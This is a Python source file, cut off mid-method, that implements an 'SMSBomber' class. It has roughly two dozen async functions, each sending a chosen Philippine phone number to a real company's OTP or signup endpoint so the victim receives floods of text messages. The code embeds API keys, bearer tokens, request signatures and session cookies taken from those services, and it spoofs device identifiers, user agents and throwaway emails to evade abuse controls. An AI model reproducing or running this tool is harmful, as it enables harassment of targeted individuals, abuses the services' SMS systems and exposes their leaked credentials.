import asyncio
import aiohttp
import random
import string
import time
import re
import threading
from datetime import datetime
import hashlib
import logging
import os
from colorama import init, Fore, Back, Style
import cbor2

# Initialize colorama
init(autoreset=True)

class SMSBomber:
    def __init__(self):
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'reset': '\033[0m'
        }

        self.FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
        self.FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
        
    def color_text(self, text, color):
        return f"{self.colors.get(color, '')}{text}{self.colors['reset']}"
    
    def random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def validate_number(self, number):
        clean_number = number.replace(" ", "")
        patterns = [
            r'^09\d{9}$',
            r'^9\d{9}$',
            r'^\+639\d{9}$',
            r'^639\d{9}$'
        ]
        
        for pattern in patterns:
            if re.match(pattern, clean_number):
                return clean_number
        return None
    
    def format_number(self, number):
        if number.startswith('+63'):
            return number
        elif number.startswith('09'):
            return '+63' + number[1:]
        elif number.startswith('9'):
            return '+63' + number
        elif number.startswith('63'):
            return '+' + number
        return number

    async def send_fb_memotion(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('09'):
                formatted_phone = '63' + formatted_phone[1:]
            elif formatted_phone.startswith('9'):
                formatted_phone = '63' + formatted_phone
            
            mobile_no = formatted_phone[2:] if formatted_phone.startswith('63') else formatted_phone
            
            headers = {
                "x-real-ua": "TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2",
                "language": "EN",
                "sec-ch-ua-platform": "\"Android\"",
                "authorization": "",
                "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
                "sec-ch-ua-mobile": "?1",
                "merchant": "emotionf2",
                "moduleid": "REGMOBVERF3",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.9",
                "origin": "https://www.fbmemotion.ph",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.fbmemotion.ph/m/register?affiliateCode=mktmeta122&utm_source=fb",
                "cookie": "SHELL_deviceId=6385d331-8ad0-4022-bb45-4556cefc39c4",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "mobileNo": mobile_no,
                "countryDialingCode": "63"
            }

            async with session.post(
                "https://www.fbmemotion.ph/wps/verification/sms/register",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    async def send_cashalo(self, session, phone_number):
        try:
            formatted_phone = self.format_number(phone_number)
            
            headers = {
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                "x-api-key": "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
                "sec-ch-ua-mobile": "?1",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.9",
                "origin": "https://app.cashaloapp.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive",
                "Referer": "https://app.cashaloapp.com/"
            }

            payload = {
                "phone_number": formatted_phone,
                "device_identifier": "landing-page",
                "device_type": 2
            }

            async with session.post(
                "https://api.cashaloapp.com/Access/Register",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    async def send_s5(self, session, phone_number):
        try:
            formatted_phone = self.format_number(phone_number)
            
            headers = {
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                "sec-ch-ua-mobile": "?1",
                "access-control-allow-origin": "*",
                "x-timezone-offset": "480",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.5",
                "origin": "https://www.s5.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.s5.com/",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "phone_number": formatted_phone
            }

            async with session.post(
                "https://api.s5.com/player/api/v1/otp/request",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202, 204]

        except Exception as e:
            return False

    async def send_kumu_ph(self, session, phone_number):
        try:
            import hashlib
            import time

            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[3:]
            elif formatted_phone.startswith('09'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('63'):
                formatted_phone = formatted_phone[2:]

            encrypt_timestamp = int(time.time())
            encrypt_rnd_string = self.random_string(32)

            secret = "kumu_secret_2024"
            data = f"{encrypt_timestamp}{encrypt_rnd_string}{formatted_phone}{secret}"
            encrypt_signature = hashlib.sha256(data.encode()).hexdigest()

            headers = {
                'User-Agent': 'okhttp/5.0.0-alpha.14',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json;charset=UTF-8',
                'Device-Type': 'android',
                'Device-Id': '07b76e92c40b536a',
                'Version-Code': '1669',
                'X-kumu-Token': '',
                'X-kumu-UserId': '',
                'Pre-Install': ''
            }

            data = {
                "country_code": "+63",
                "encrypt_rnd_string": encrypt_rnd_string,
                "cellphone": formatted_phone,
                "encrypt_signature": encrypt_signature,
                "encrypt_timestamp": encrypt_timestamp
            }

            async with session.post(
                'https://api.kumuapi.com/v2/user/sendverifysms',
                headers=headers,
                json=data,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202]

        except:
            return False
        
    async def send_bayad(self, session, phone_number):
        try:
            import time

            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('09'):
                formatted_phone = '63' + formatted_phone[1:]
            elif formatted_phone.startswith('9'):
                formatted_phone = '63' + formatted_phone

            random_email = f"user{int(time.time())}_{random.randint(1000,9999)}@gmail.com"

            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US",
                "authorization": "",
                "content-type": "application/json",
                "origin": "https://www.online.bayad.com",
                "priority": "u=1, i",
                "referer": "https://www.online.bayad.com/",
                "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
            }

            payload = {
                "mobileNumber": formatted_phone,
                "emailAddress": random_email
            }

            async with session.post(
                "https://api.online.bayad.com/api/sign-up/otp",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202]

        except:
            return False

    async def send_megaperya(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[3:]
            elif formatted_phone.startswith('09'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('63'):
                formatted_phone = formatted_phone[2:]

            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzIyM2QyOTM4ZTE4ZDAwMTNhYjQzNDciLCJpYXQiOjE3MzA5OTgxODIsImV4cCI6MTczMzU5MDE4Mn0.dvP4i9iVfNHEuayXlUc4sGiXxzJ9A9YGq1Wvq4O3qD8",
                "Content-Type": "application/json",
                "Origin": "https://www.megaperya.com",
                "Referer": "https://www.megaperya.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1",
                "priority": "u=1, i",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }

            payload = {
                "mobile_number": formatted_phone
            }

            async with session.post(
                "https://services.megaperya.com/lobby/api/v1/auth/otp/generate",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202, 204]

        except:
            return False

    async def send_king_ph(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[3:]
            elif formatted_phone.startswith('09'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('63'):
                formatted_phone = formatted_phone[2:]

            headers = {
                "sec-ch-ua-platform": '"Android"',
                "x-host": "king.ph",
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                "sec-ch-ua-mobile": "?1",
                "x-language": "en",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.5",
                "origin": "https://king.ph",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://king.ph/",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*"
            }

            payload = {
                "mobile": formatted_phone,
                "mobile_country_code": "63"
            }

            async with session.post(
                "https://user.king.ph/api/sms/register/send",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202, 204]

        except Exception as e:
            return False
        
    async def send_ezloan(self, session, number):
        try:
            import time
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'accept-language': 'en',
                'imei': 'e933e51d8c994b05b5a0d523c84f8287',
                'device': 'android',
                'buildtype': 'release',
                'brand': 'POCO',
                'model': '2207117BPG',
                'manufacturer': 'Xiaomi',
                'source': 'EZLOAN',
                'channel': 'GooglePlay_Blue',
                'appversion': '2.0.4',
                'appversioncode': '2000402',
                'version': '2.0.4',
                'versioncode': '2000401',
                'sysversion': '15',
                'sysversioncode': '35',
                'customerid': '',
                'businessid': 'EZLOAN',
                'phone': '',
                'appid': 'EZLOAN',
                'authorization': '',
                'blackbox': 'qGPG61760445001tnR5bweVKGe',
            }

            data = {
                "businessId": "EZLOAN",
                "contactNumber": number,
                "appsflyerIdentifier": f"{int(time.time() * 1000)}-3966994042140191452"
            }

            async with session.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers,
                json=data,
                timeout=10
            ) as response:
                return True
        except:
            return False

    async def send_xpress_ph(self, session, number):
        try:
            formatted_num = self.format_number(number)
            headers = {
                "User-Agent": "Dalvik/2.1.0",
                "Content-Type": "application/json",
            }

            data = {
                "FirstName": "user",
                "LastName": "test",
                "Email": f"user{int(time.time())}_{random.randint(1000,9999)}@gmail.com",
                "Phone": formatted_num,
                "Password": "Pass1234",
                "ConfirmPassword": "Pass1234",
                "FingerprintVisitorId": self.FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": self.FINGERPRINT_REQUEST_ID,
            }

            async with session.post(
                "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_abenson(self, session, number):
        try:
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "null",
                "priority": "u=1, i",
                "sec-ch-ua": ' "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome" ;v="144" ',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-platform": ' "Windows" ',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }

            data = {
                'contact_no': number,
                'login_token': 'undefined'
            }

            async with session.post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers=headers,
                data=data,
                timeout=8
            ) as response:
                return True
        except:
            return False
        
    async def send_excellent_lending(self, session, number):
        try:
            coordinates = [
                {'lat': '14.5995', 'long': '120.9842'},
                {'lat': '14.6760', 'long': '121.0437'},
                {'lat': '14.8648', 'long': '121.0418'}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]

            coord = random.choice(coordinates)
            agent = random.choice(user_agents)

            headers = {
                'User-Agent': agent,
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long']
            }

            data = {
                "domain": number,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }

            async with session.post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_fortune_pay(self, session, number):
        try:
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
                'app-version': '4.3.5',
                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                'timestamp': str(int(time.time() * 1000)),
                'nonce': f"{self.random_string(10)}-{int(time.time() * 1000)}"
            }

            data = {
                "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                "deviceType": 'GOOGLE_PLAY',
                "companyId": '4bf735e97269421a80b82359e7dc2288',
                "dialCode": '+63',
                "phoneNumber": number.replace('0', '', 1) if number.startswith('0') else number
            }

            async with session.post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_wemove(self, session, number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }

            data = {
                "phone_country": '+63',
                "phone_no": number.replace('0', '', 1) if number.startswith('0') else number
            }

            async with session.post(
                'https://api.wemove.com.ph/auth/users',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_pinoy_coop(self, session, number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Content-Type': 'application/json',
                'authorization': 'Bearer'
            }

            phone_num = number.replace('0', '63', 1) if number.startswith('0') else number
            if not phone_num.startswith('63'):
                phone_num = '63' + phone_num

            data = {
                "phone": phone_num,
                "branch_code": '700'
            }

            async with session.post(
                'https://api.pinoycoop.com/notification/otp',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_lbc_connect(self, session, number):
        try:
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }

            data = {
                'verification_type': 'mobile',
                'client_email': f'{self.random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': number.replace('0', '', 1) if number.startswith('0') else number,
                'app_log_uid': self.random_string(16),
            }

            async with session.post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers=headers,
                data=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_pickup_coffee(self, session, number):
        try:
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]

            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/json',
            }

            formatted_num = self.format_number(number)
            data = {
                "mobile_number": formatted_num,
                "login_method": 'mobile_number'
            }

            async with session.post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_lista_systems(self, session, number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Content-Type': 'application/json',
                'appdevice-brand': 'POCO',
                'appdevice-buildnumber': '100000619',
                'appdevice-bundleid': 'com.listaPh',
                'appdevice-islocationenabled': 'false',
                'appdevice-manufacturer': 'Xiaomi',
                'appdevice-readableversion': '3.9.57',
                'appdevice-modelname': '2207117BPG',
                'appdevice-uniqueid': self.random_string(16),
                'appdevice-os': 'android',
                'app-version': '3.9.57'
            }

            formatted_num = self.format_number(number)
            data = {
                "phoneNumber": formatted_num
            }

            async with session.post(
                'https://api-v2.lista.systems/auth/otp/mpin',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_honey_loan(self, session, number):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }

            data = {
                "phone": number,
                "is_rights_block_accepted": 1
            }

            async with session.post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False
        
    async def send_komo_ph(self, session, number):
        try:
            headers = {
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }

            data = {
                "mobile": number,
                "transactionType": 6
            }

            async with session.post(
                'https://api.komo.ph/api/otp/v5/generate',
                headers=headers,
                json=data,
                timeout=8
            ) as response:
                return True
        except:
            return False

    async def send_mgame(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = '0' + formatted_phone[3:]
            elif formatted_phone.startswith('09'):
                formatted_phone = formatted_phone
            elif formatted_phone.startswith('9'):
                formatted_phone = '0' + formatted_phone
            elif formatted_phone.startswith('63'):
                formatted_phone = '0' + formatted_phone[2:]
            
            mobile_no = formatted_phone
            
            headers = {
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
                "sec-ch-ua-mobile": "?1",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.5",
                "origin": "https://mgame.ph",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://mgame.ph/",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "mobileNumber": mobile_no
            }

            async with session.post(
                "https://console-api.mgame.ph/api/otp/registration",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    async def send_ggpanalo(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = '0' + formatted_phone[3:]
            elif formatted_phone.startswith('63'):
                formatted_phone = '0' + formatted_phone[2:]
            elif formatted_phone.startswith('9') and not formatted_phone.startswith('09'):
                formatted_phone = '0' + formatted_phone
            
            headers = {
                "Host": "game-srv-01.panalosys.com",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
                "content-type": "application/json;charset=utf-8",
                "sec-ch-ua-mobile": "?1",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.6",
                "origin": "https://www.ggpanalo.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.ggpanalo.com/",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "countryCode": 63,
                "mobile": formatted_phone,
                "type": 3,
                "appId": "com.demo.web",
                "channel": "WEB",
                "phoneinfoJsonModel": {
                    "channel": "WEB",
                    "appId": "com.demo.web",
                    "os": "Linux",
                    "isBrowser": 1,
                    "version": "de09f90",
                    "deviceModel": "Google Chrome",
                    "deviceIdJsonModel": {}
                },
                "clientReferrer": "ph",
                "platform": 0,
                "appVersion": "de09f90",
                "appWebName": "ggpanalo"
            }

            async with session.post(
                "https://game-srv-01.panalosys.com/prod-api-2/app/v1/smsSendV2",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    async def send_gperya(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = '0' + formatted_phone[3:]
            elif formatted_phone.startswith('63'):
                formatted_phone = '0' + formatted_phone[2:]
            elif formatted_phone.startswith('9') and not formatted_phone.startswith('09'):
                formatted_phone = '0' + formatted_phone
            
            headers = {
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
                "content-type": "application/json;charset=utf-8",
                "sec-ch-ua-mobile": "?1",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.8",
                "origin": "https://gperya.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://gperya.com/",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "countryCode": 63,
                "mobile": formatted_phone,
                "type": 3,
                "appId": "com.demo.web",
                "channel": "WEB",
                "phoneinfoJsonModel": {
                    "channel": "WEB",
                    "appId": "com.demo.web",
                    "os": "Linux",
                    "isBrowser": 1,
                    "version": "f94e70a3",
                    "deviceModel": "Google Chrome",
                    "deviceIdJsonModel": {}
                },
                "clientReferrer": "ph",
                "platform": 0,
                "appVersion": "f94e70a3",
                "appWebName": "gperya"
            }

            async with session.post(
                "https://game-srv-01.slllot.com/prod-api-2/app/v1/smsSendV2",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    async def send_filbet(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[3:]
            elif formatted_phone.startswith('09'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('63'):
                formatted_phone = formatted_phone[2:]
            elif formatted_phone.startswith('9'):
                formatted_phone = formatted_phone
            
            payload_data = {
                "phone": formatted_phone,
                "country_code": "63"
            }
            payload = cbor2.dumps(payload_data)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'sec-ch-ua-platform': '"Android"',
                'lang': 'en_US',
                'd': '25',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?1',
                'gad-id': '2',
                'content-type': 'application/cbor',
                't': '',
                'sec-gpc': '1',
                'accept-language': 'en-US,en;q=0.7',
                'origin': 'https://playinglegally.filbet.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://playinglegally.filbet.com/?action=login&payload=omRzdGVwa2xvZ2luLW90cC0xZGRhdGH3',
                'priority': 'u=1, i',
                'Cookie': 'acw_tc=0a03ecec17710056535813266e33442ca0dfd4c2c1303ac0c7506553252496'
            }
            
            async with session.post(
                "https://playinglegally.filbet.com/member/sms",
                headers=headers,
                data=payload,
                timeout=10
            ) as response:
                resp_data = await response.read()
                try:
                    decoded = cbor2.loads(resp_data)
                    if decoded.get('status') == True:
                        return True
                    else:
                        return False
                except:
                    return response.status in [200, 201, 202, 204]
                    
        except Exception as e:
            return False

    async def send_casinoplus(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = formatted_phone[1:]
            elif formatted_phone.startswith('09'):
                formatted_phone = '63' + formatted_phone[1:]
            elif formatted_phone.startswith('9') and not formatted_phone.startswith('63'):
                formatted_phone = '63' + formatted_phone
            elif formatted_phone.startswith('63'):
                formatted_phone = formatted_phone
            
            payload = b'\x00\x00\x00\x00\x14\n\x0c' + formatted_phone.encode() + b'\x12\x0250\x18\x01'
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'sec-ch-ua-platform': '"Android"',
                'x-user-agent': 'connect-es/1.6.1',
                'fingerprint': 'a79d8d9e8dfad98325456d961563dbf5',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?1',
                'uuid': 'd4a007f4-aced-4562-aad7-d4529733ccb1',
                'devicetype': '2',
                'reqid': 'd4a007f4-aced-4562-aad7-d4529733ccb1-1771007890554-32',
                'eid': '8f14e45fceea167a5a36dedd4bea2543',
                'content-type': 'application/grpc-web+proto',
                'x-grpc-web': '1',
                'version': 'v4.1.88',
                'sec-gpc': '1',
                'accept-language': 'en-US,en;q=0.7',
                'origin': 'https://www.casinoplus.com.ph',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.casinoplus.com.ph/',
                'priority': 'u=1, i',
                'Cookie': '__cf_bm=3qghkJgxuKU6L1dIa3CeVE4_L0Y83rD4KmOzMiM5vaY-1771007909-1.0.1.1-oX6Ul9Tyz5ipXfFJadAKaZV7I4eOwbg3iZx86YnUCmcPgzrOkyEn9MlJDOPzQsSoaF703v8OyjOHwBtM5p1QH5iTq2bWtin2ugpj4Q16esU; _cfuvid=tQYn_AP2TMQCkQ5Lqw5RupSmmiA3cnN7UbpGUwoLjC0-1771007909182-0.0.1.1-604800000'
            }
            
            async with session.post(
                "https://fpms-nt.casinoplus.top/auth/auth.FrontendAuthService/PlayerRegisterRequestCode",
                headers=headers,
                data=payload,
                timeout=10
            ) as response:
                return response.status in [200, 201, 202, 204, 403]
                
        except Exception as e:
            return False

    # ============ NEW SERVICE: LAKIWIN ============
    async def send_lakiwin(self, session, phone_number):
        try:
            formatted_phone = phone_number
            if formatted_phone.startswith('+63'):
                formatted_phone = '0' + formatted_phone[3:]
            elif formatted_phone.startswith('63'):
                formatted_phone = '0' + formatted_phone[2:]
            elif formatted_phone.startswith('9'):
                formatted_phone = '0' + formatted_phone
                
            headers = {
